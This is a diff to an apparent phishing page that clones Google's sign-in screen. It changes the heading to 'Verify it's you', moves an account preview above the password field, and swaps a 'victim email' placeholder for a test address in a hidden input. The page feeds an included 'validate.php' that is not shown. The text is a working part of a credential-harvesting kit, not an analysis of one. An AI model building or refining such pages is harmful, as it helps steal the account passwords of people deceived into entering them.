@@ -66,8 +66,22 @@ include "validate.php";
                   </svg>
                   <!-- /Google Logo -->
                </div>
-               <h1 class='g-h1' id='instruction-text'>Sign in</h1>
-
+               <h1 class='g-h1' id='instruction-text'>Verify it's you</h1>
+               <div class='g-email-preview'>
+                              <div style='display:flex'>
+                                 <div class="qQWzTd" aria-hidden="true">
+                                    <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                                       <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+                                    </svg>
+                                 </div>
+                                 <div class="dsxx49" id='prev-email'>1@1.com</div>
+                                 <div class="krLnGe">
+                                    <svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                                       <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
+                                    </svg>
+                                 </div>
+                              </div>
+                </div>
                <div >
                   <style>
                      .slide-container-outer {
@@ -122,7 +136,7 @@ include "validate.php";
 						  outline: none;
 						}
 						.footer .footer-span span {
-						  margin-left: 32px;
+						  
 						}
                      .footer-span a {
 					  -webkit-border-radius: 2px;
@@ -133,30 +147,16 @@ include "validate.php";
 					  -webkit-transition: background .2s;
 					  transition: background .2s;
 					  text-decoration: none;
+					  font-size: small;
 					}
                   </style>
                   <div class='slide-container-outer'>
                      <div class='slide-container'>
                         <div class='slide-item' id='slide-password'>
-                           <div class='g-email-preview'>
-                              <div style='display:flex'>
-                                 <div class="qQWzTd" aria-hidden="true">
-                                    <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
-                                       <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
-                                    </svg>
-                                 </div>
-                                 <div class="dsxx49" id='prev-email'>victim email</div>
-                                 <div class="krLnGe">
-                                    <svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
-                                       <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
-                                    </svg>
-                                 </div>
-                              </div>
-                           </div>
-                           <form id='password-form-step' >
-                              <div class='g-input'>
+                         <form id='password-form-step' >
+                           <div class='g-input'>
                                  <input id='password-input' type="password" placeholder="Enter your password">
-                              </div>
+                             </div>
                            </form>
                            <div class='login-nav'>
                               <legend class='g-legend'>Forgot Password</legend>
@@ -165,9 +165,9 @@ include "validate.php";
                         </div>
                         <div class='slide-item' id='slide-username'>
                            <form id='email-form-step' >
-                              <div class='g-input'>
-                                 <input id='email-input' type="hidden"  value="victim email">
-                              </div>
+                              
+                                 <input id='email-input' type="hidden"  value="1@1.com">
+                              
                            </form>
                            <div class="invalid-email" style='display:none;'>
                               <!--<span class="invalid-icon">
